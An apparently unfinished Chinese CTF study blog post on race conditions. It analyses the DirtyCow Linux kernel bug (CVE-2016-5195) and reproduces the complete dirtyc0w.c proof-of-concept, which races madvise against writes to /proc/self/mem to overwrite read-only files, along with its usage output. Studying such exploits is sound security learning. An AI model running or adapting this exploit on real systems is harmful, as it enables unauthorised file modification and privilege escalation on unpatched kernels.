---
title: 条件竞争学习 之 DirtyCow分析
date: 2019-11-18 00:00:00
categories:
- CTF/Pwn
tags: dirtycow
---

## 条件竞争简介

[Race Condition](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/)

参考CTF Wiki：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现bug。条件竞争的条件：

1. 并发
2. 共享对象
3. 改变对象
 
分析条件竞争就是分析两个并发的线程/进程在不断的对共享对象做什么？更简单的说，条件竞争就是分析两个“不断”。

> 突然想到侧信道攻击的条件，不需要并发，不需要改变对象，只需要能读取到共享对象即可

## CTF Wiki中的练习

[构造例子](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/problem-zh/)

跟着完成了一遍这个例子，总结一下就是利用条件竞争使得漏洞程序可以执行到一个可以栈溢出的漏洞函数，进而getshell。完成这里的例子测试中发现sleep不用0.000008，随便用个1，一样可以达到效果。不过我觉得这里的例子的情景说明的不是很清楚，仔细分析一下，这里的漏洞进程和攻击者进程都是我们自己运行起来的，其中：

- 受害者进程：循环启动./test fake的脚本进程
- 攻击者进程：循环拷贝和删除文件的脚本进程
- 共享资源是：fake文件

条件竞争中，分清进程和线程间的角色，是理解这种漏洞如何利用的关键。分析的目标是受害者进程，构造的是攻击者进程。因为条件竞争本身是一种时间维度上的漏洞，要求是并发，所以这两个进程需要拼命的循环，才可能巧合遇到攻击者进程控制的共享资源可以攻击到受害者进程。所以在CTF中，web中的条件竞争漏洞考察的次数比较多，因为可以通过访问不同页面达到启动两个不同的进程，通过快速多次访问两个不同的功能达到并发的条件。而在Pwn题目中，可以让选手操作一个可以循环的攻击者进程的情景不是很好操作，所以在Pwn中的条件竞争一般要放到线程中出题，便于构造漏洞。

如果想把这道题目作为一道CTF题目让选手做，可以把受害者进程循环启动起来，构造沙盒让选手可以上传攻击的二进制文件并且可以循环运行，但是不可以访问到flag或者让攻击者进程调试到受害者进程。

## DirtyCow分析

冬令营听了两遍DirtyCow还是不太懂，这次决定借着学习条件竞争的机会搞懂这个很出名的漏洞。首先介绍一下DirtyCow，其CVE编号：CVE-2016-5195。Linux内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。影响版本2.6.22到4.8.3, 4.7.9, 4.4.26之前。首先通过这次的学习总结一下这个漏洞的情景和原理：

### 漏洞情景

利用DirtyCow漏洞可以任意修改文件系统中当前用户没有写权限的文件，即任意文件的写操作，从而使得攻击者从一个低权限的用户提升到一个高权限的用户。其中：

- 受害者线程：不断写内存的一个线程，这个内存区域是要更改的只读文件的内存映射
- 攻击者线程：不断通知操作系统，只读文件的内存映射的这片内存当前进程不再使用的一个线程
- 共享对象是：两个线程属于同一个进程，该进程的页表项是两个线程的共享对象

所以可见所谓的受害者线程，还是攻击者自己写的，那到底怎么个受害法呢？攻击者自己害自己？因为这里其实我们攻击的角色是操作系统，受害者线程里的写内存的代码是操作系统的系统调用。攻击者构造了两个线程，利用攻击者线程中系统调用代码，攻击受害者线程里的系统调用的代码，从而导致受害者线程中的系统调用的代码执行出错，修改了一个只读文件的内容。所以受害者其实是操作系统。

### 漏洞原理概括

控制分配的页表的写意图标记位在某个时刻会被丢掉，如果这时利用一个线程清空页表，再次进行缺页处理时，则会把pagecache作为该页的物理地址，页表虽然没有标记可写，但是可以硬写。写入之后由于回写机制，会将修改返回真实文件。

> 最重要的是两个线程的操作：一个线程调用write(2)写/proc/self/mem，另一个线程调用madvice(MADV_DONTNEED)。由于这两个线程操作的相互竞争，当wirte(2)直接修改基于文件的内存映射时（即使涉及到的文件不允许被攻击者进程写）会产生一个安全问题，最终导致提权。

> 其实具体说可能有点绕，就是foll_write标志在row特性执行后去掉了，但是再次执行时却没有检查页表项的有效性，导致我们可以利用另一个线程清空页表。清空的页表由于没有了foll_write权限要求，再次被分配时就不执行row执行机制，导致原本不应该本写的地址拥有了写的权限。

### PoC代码理解

这漏洞的PoC非常短，用法如下：

```c
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
```

PoC如下：

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc,char *argv[])
{
  if (argc<3)return 1;
  pthread_t pth1,pth2;
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

可见这个PoC的代码也非常简单易懂，需要了解linux的6个系统调用，可以通过man手册查询：

- open:  打开一个文件系统中的文件，返回文件描述符
- write: 向打开的文件描述符中，写相应的内容
- fstat: 获得文件描述符指向的文件的更多信息，如文件大小等
- mmap:  通过文件描述符，将已经打开的文件映射到内存中
- lseek: 按照偏移更改文件描述符的指针
- madvise: 将自己的主动的控制内存的行为告知操作系统内核

这里首先main函数打开要修改的文件，并且以只读和私有方式映射到内存中（正常操作时用open方法打开的文件不会加载到用户态的内存中），然后启动两个线程，procselfmemThread线程不断写那段内存，madviseThread线程不断释放那段内存。所以关键的就是分析两个不断：

- 怎么个不断写内存？
- 又怎么个不断释放内存？

而且我们要修改的是文件，是文件系统的中的概念，物理的存储在磁盘上，那么为什么我们这里不断修改内存，最终会影响磁盘上的内容呢？我们并没有对main函数里open的那个文件进行任何的修改呀！所以想要搞懂DirtyCow的工作原理，必须要明白相关的linux的内存管理机制。而且这里我们不能仅仅分析操作系统给每个程序划分的4G虚拟的内存空间了（32位下），还要分析真实的物理内存，即对应到电脑上的内存条上的地址。

### 相关linux的内存管理机制

#### 虚拟内存管理和写时复制


#### 页式内存管理和缺页中断

我们都知道，每个进程都有自己的虚拟空间，虚拟空间中的地址到真实内存条上的物理地址是要根据页表对应查找的。这个页表是每个进程都有的一个大数组，操作系在统物理内存中分配这段空间，并将这个大数组的起始地址存储到页表基址寄存器。这样即可通过查询页表将进程虚拟空间中的逻辑地址转换为内存条上的物理地址。

#### Linux虚拟文件系统


### 漏洞原理详解

### 完整利用工具

